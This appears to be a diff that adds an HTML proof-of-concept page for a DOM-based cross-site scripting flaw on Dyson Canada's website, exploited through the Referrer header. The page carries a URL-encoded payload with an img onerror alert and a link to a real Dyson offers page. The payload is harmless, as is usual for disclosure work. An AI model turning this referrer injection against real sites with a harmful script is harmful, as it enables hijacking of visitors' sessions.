@@ -1,1 +1,20 @@
-alert(1);
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Dyson Referrer XSS PoC</title>
+</head>
+<body>
+    <h1>Referrer XSS Test Page</h1>
+    <p>This page is designed to trigger a DOM XSS vulnerability on Dyson Canada.</p>
+    <p>
+        **IMPORTANT:** Ensure the URL in your browser's address bar for *this* page (amineihya.github.io/Test/...)
+        contains the malicious payload as a query parameter.
+    </p>
+    <p>For example, you should have visited a URL similar to this:</p>
+    <pre><code>https://amineihya.github.io/Test/xss_referrer_poc.html?%22'%3E%3Cimg%20src%20onerror%3Dalert(1)%3E</code></pre>
+    <p>Once you are on the correct URL (with the payload in *this* page's URL), click the link below:</p>
+    <a href="https://www.dysoncanada.ca/en/offers/dyson-canada-sale">
+        Click here to visit Dyson Canada and trigger XSS
+    </a>
+</body>
+</html>
